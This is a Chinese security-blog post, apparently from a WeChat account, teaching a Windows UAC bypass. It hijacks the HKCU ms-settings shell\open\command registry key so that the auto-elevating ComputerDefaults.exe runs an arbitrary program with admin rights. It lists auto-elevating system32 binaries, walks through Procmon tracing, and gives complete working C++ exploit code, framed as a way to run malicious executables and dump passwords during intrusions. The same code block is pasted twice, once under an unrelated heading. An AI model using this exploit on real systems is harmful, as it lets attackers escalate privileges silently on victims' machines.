> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tnsETvenkzqX_PBeDaqTTQ)

0x01 概念
-------

用户帐户控制（User Account Control，简写作 UAC) 是微软公司在其 Windows Vista 及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为 “恶意软件”）损坏系统的效果。

当前用户是管理员权限，但是有些 exe 会弹出用户账户控制，如果点击否的话，就会出现拒绝访问，那么也就没有成功运行该程序了。这样就会影响后续的内网渗透，例如取密码等，所以我们需要 bypassuac。

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9WvE7lWXyq2ibHXH1odZ7EAsmtdIO0N39pt74ZbpBO75Ds2CTGkfn96dOg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9WvhM6SB448ghahWEYF9a6F0CBrKI1lQ65wPBSI1SM737ichJsh55EX3iaw/640?wx_fmt=png)

手动 bypassuac，右键以管理员身份运行，但是显然这个是不现实的

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9Wv9pqUnT3uzqOcPDKibrNQiawchzTCTgibGZVdmswlbv68XmibjteWC1gc5Q/640?wx_fmt=png)

0x02 发掘 bypassUAC 的程序
---------------------

有一些系统程序是会直接获取管理员权限同时不弹出 UAC 弹窗，这类程序被称为白名单程序。这些程序拥有 autoElevate 属性的值为 True，会在启动时就静默提升权限。

```
c:\windows\system32\bthudtask.exe
c:\windows\system32\changepk.exe
c:\windows\system32\ComputerDefaults.exe
c:\windows\system32\dccw.exe
c:\windows\system32\dcomcnfg.exe
c:\windows\system32\DeviceEject.exe
c:\windows\system32\DeviceProperties.exe
c:\windows\system32\djoin.exe
c:\windows\system32\easinvoker.exe
c:\windows\system32\EASPolicyManagerBrokerHost.exe
c:\windows\system32\eudcedit.exe
c:\windows\system32\eventvwr.exe
c:\windows\system32\fodhelper.exe
c:\windows\system32\fsquirt.exe
c:\windows\system32\FXSUNATD.exe
c:\windows\system32\immersivetpmvscmgrsvr.exe
c:\windows\system32\iscsicli.exe
c:\windows\system32\iscsicpl.exe
c:\windows\system32\lpksetup.exe
c:\windows\system32\MSchedExe.exe
c:\windows\system32\msconfig.exe
c:\windows\system32\msra.exe
c:\windows\system32\MultiDigiMon.exe
c:\windows\system32\newdev.exe
c:\windows\system32\odbcad32.exe
c:\windows\system32\PasswordOnWakeSettingFlyout.exe
c:\windows\system32\pwcreator.exe
c:\windows\system32\rdpshell.exe
c:\windows\system32\recdisc.exe
c:\windows\system32\rrinstaller.exe
c:\windows\system32\shrpubw.exe
c:\windows\system32\slui.exe
c:\windows\system32\Sysprep\sysprep.exe
c:\windows\system32\SystemPropertiesAdvanced.exe
c:\windows\system32\SystemPropertiesComputerName.exe
c:\windows\system32\SystemPropertiesDataExecutionPrevention.exe
c:\windows\system32\SystemPropertiesHardware.exe
c:\windows\system32\SystemPropertiesPerformance.exe
c:\windows\system32\SystemPropertiesProtection.exe
c:\windows\system32\SystemPropertiesRemote.exe
c:\windows\system32\SystemSettingsAdminFlows.exe
c:\windows\system32\SystemSettingsRemoveDevice.exe
c:\windows\system32\Taskmgr.exe
c:\windows\system32\tcmsetup.exe
c:\windows\system32\TpmInit.exe
c:\windows\system32\WindowsUpdateElevatedInstaller.exe
c:\windows\system32\WSReset.exe
c:\windows\system32\wusa.exe
```

### 0x02-1 寻找 autoElevate 为 true 的程序

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9WvmV5u9C7Fon5xj2ib0utmerI23pBQNKDBQmPTxibwulVDIybErm4Xic2DQ/640?wx_fmt=png)

这里写了个 py 脚本遍历 c:\windows\system32 \ 目录下的所有 exe 文件，寻找 autoElevate 为 true 的 exe 程序

```
c:\windows\system32\bthudtask.exe                       ok
c:\windows\system32\changepk.exe
c:\windows\system32\ComputerDefaults.exe                ok      1
c:\windows\system32\dccw.exe                            ok      1
c:\windows\system32\dcomcnfg.exe                        ok      1
c:\windows\system32\DeviceEject.exe                     ok
c:\windows\system32\DeviceProperties.exe                ok
c:\windows\system32\djoin.exe                           ok
c:\windows\system32\easinvoker.exe                      ok
c:\windows\system32\EASPolicyManagerBrokerHost.exe      ok
c:\windows\system32\eudcedit.exe                        ok      1
c:\windows\system32\eventvwr.exe                        ok      1
c:\windows\system32\fodhelper.exe                       ok      1
c:\windows\system32\fsquirt.exe                         ok      1
c:\windows\system32\FXSUNATD.exe                        ok
c:\windows\system32\immersivetpmvscmgrsvr.exe           ok
c:\windows\system32\iscsicli.exe                        ok      1
c:\windows\system32\iscsicpl.exe                        ok      1
```

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9WvHzEzRmWotQrssFYzJCnnIJTmCys1nNicfqiaGT30wJdCVuCicLicFwct4Q/640?wx_fmt=png)

结果如下：

```
#include <stdio.h>
#include <Windows.h>

int wmain(int argc, wchar_t* argv[]) {
if (argc != 2) {
        wprintf(L"Usage: %s <filePath>\n", argv[0]);
        wprintf(L"       %s cmd.exe\n", argv[0]);
exit(1);
    }

    LPWSTR filePath = argv[1];

    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    HKEY hKey;

    si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);       // 创建注册表项
    RegSetValueExW(hKey, L"", 0, REG_SZ, (LPBYTE)filePath, lstrlenW(filePath));                             // 赋值，执行的exe路径
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
// 创建进程ComputerDefaults
    CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);

// 延时十秒，等ComputerDefaults.exe运行
    Sleep(10000);
// 清楚注册表项
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

return 0;
}
```

### 0x02-2 寻找不弹 UAC 框的程序

在 cmd 一个个的去运行 exe，如果不弹 uac 框就运行的既是

结果如下，下面只是找的前面几个，后面的没有去测试

```
c:\windows\system32\bthudtask.exe                       ok
c:\windows\system32\changepk.exe
c:\windows\system32\ComputerDefaults.exe                ok      1
c:\windows\system32\dccw.exe                            ok      1
c:\windows\system32\dcomcnfg.exe                        ok      1
c:\windows\system32\DeviceEject.exe                     ok
c:\windows\system32\DeviceProperties.exe                ok
c:\windows\system32\djoin.exe                           ok
c:\windows\system32\easinvoker.exe                      ok
c:\windows\system32\EASPolicyManagerBrokerHost.exe      ok
c:\windows\system32\eudcedit.exe                        ok      1
c:\windows\system32\eventvwr.exe                        ok      1
c:\windows\system32\fodhelper.exe                       ok      1
c:\windows\system32\fsquirt.exe                         ok      1
c:\windows\system32\FXSUNATD.exe                        ok
c:\windows\system32\immersivetpmvscmgrsvr.exe           ok
c:\windows\system32\iscsicli.exe                        ok      1
c:\windows\system32\iscsicpl.exe                        ok      1
```

### 0x02-3 从注册表里查询 Shell\Open\command 键值对

通常以 shell\open\command 命名的键值对存储的是可执行文件的路径，如果 exe 程序运行的时候找到该键值对，就会运行该键值对的程序，而因为 exe 运行的时候是静默提升了权限，所以运行的该键值对的程序就已经过了 uac。

所以我们把恶意的 exe 路径写入该键值对，那么就能够过 uac 执行我们的恶意 exe。

使用 Procmon 监听，运行 0x02-2 的结果

这里以 c:\windows\system32\ComputerDefaults.exe 测试

过滤条件如下

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9Wv9fRNYl8MwhktBtvdDq4dRtG0YChYkNrfLiaIjDYFyNn8z7qdVA95Fcg/640?wx_fmt=png)

会去查询 HKCU:\Software\Classes\ms-settings\shell\open\command

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9Wv8C8HyK3RGtahSPHJ6QMgW26qAlVYAHWS7oNIQL8cNKoXHdUfialgyibw/640?wx_fmt=png)

然后我们再注册表里创建该键值对

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9WvO0d0V16zicFKM77E14JiaQeuvn3sCcx4t06yLpehZFOrQBibdwjguP2Rw/640?wx_fmt=png)

继续监听，重新运行 c:\windows\system32\ComputerDefaults.exe，发现还查询了 HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute 的键值对

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9Wv4Z5RUDqBfFNzicf4hJY2ibvibicq96E2sbwtVmoc3uhagg1vXcZ5XUia19A/640?wx_fmt=png)

在注册表里创建 HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9Wv7LpzSj8BTMp2OVAwz59Estw4tboREvWQ4IWHjp6tWcssicA0LLwGETw/640?wx_fmt=png)

继续监听，重新运行 c:\windows\system32\ComputerDefaults.exe，这时候采取获取 Software\Classes\ms-settings\shell\open\command 的默认值，然后就会运行该值的程序

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9WvfVxI8thiapqwia4YfdWiaC2k3csdibPADEzic8XW2wGHLiadU0pCjDXDckLw/640?wx_fmt=png)

### 0x02-4 总结

如果键值对 HKCU:\Software\Classes\ms-settings\shell\open\command 存在，ComputerDefaults 会接下去查找 HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute 是否也存在, 若也存在到则读取 HKCU:\Software\Classes\ms-settings\shell\open\command 的值然后执行。

测试：将 HKCU:\Software\Classes\ms-settings\shell\open\command(default) 的值设置为 cmd.exe，然后运行 c:\windows\system32\ComputerDefaults.exe

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9WvyDFdV8iaHM7h4bPtULBaGQ17OtH0ZibDriagJkmexQgTvR6qlvzl0iblyA/640?wx_fmt=png)

成功弹出 exe，并且是过了 uac 的权限

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9WvDtziarMakKBFvXzdSYEw4UTdiazRLngicWo96IjwicK4JNNLnYhaEtI6Cw/640?wx_fmt=png)

0x03 C++ 代码实现运行任意 exe 过 uac
---------------------------

```
#include <stdio.h>
#include <Windows.h>
int wmain(int argc, wchar_t* argv[]) {
if (argc != 2) {
        wprintf(L"Usage: %s <filePath>\n", argv[0]);
        wprintf(L"       %s cmd.exe\n", argv[0]);
exit(1);
    }
    LPWSTR filePath = argv[1];
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    HKEY hKey;
    si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);       // 创建注册表项
    RegSetValueExW(hKey, L"", 0, REG_SZ, (LPBYTE)filePath, lstrlenW(filePath));                             // 赋值，执行的exe路径
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
// 创建进程ComputerDefaults
    CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
// 延时十秒，等ComputerDefaults.exe运行
    Sleep(10000);
// 清楚注册表项
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
return 0;
}
```

效果：

![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9WveRJcZJDVQYRHaxNRzslefA6CcLhEHlBbpM8s7LIMZVgcqMpRf7WGRw/640?wx_fmt=png)

参考链接
----

https://idiotc4t.com/privilege-escalation/bypassuac-fodhelper

师傅们抽奖还可以参与，我号人少中奖率高![](https://mmbiz.qpic.cn/mmbiz_png/m41BLSafyI4R3CRgHID9hVfy4F7mw9Wvq03XmSOvN8lmrDL1ROtueU9iaOmlOYibcWKZ0j4oicsI7iboKKqzafA44Q/640?wx_fmt=png)[内网域渗透工具 (文末赠书)](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247488638&idx=1&sn=ae394b79516e4e5d0ab6548e30ed3b90&chksm=c30bc70ef47c4e18237fdfa529e3cabf70e15b9d4b260f48d88cd713edbfc8aa4b605f8c9024&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

刚入行萌新热爱学习与收藏。感谢各位师傅支持与关注![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“如侵权请私聊公众号删文”

 ****欢迎关注 系统安全运维****   

公众号

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**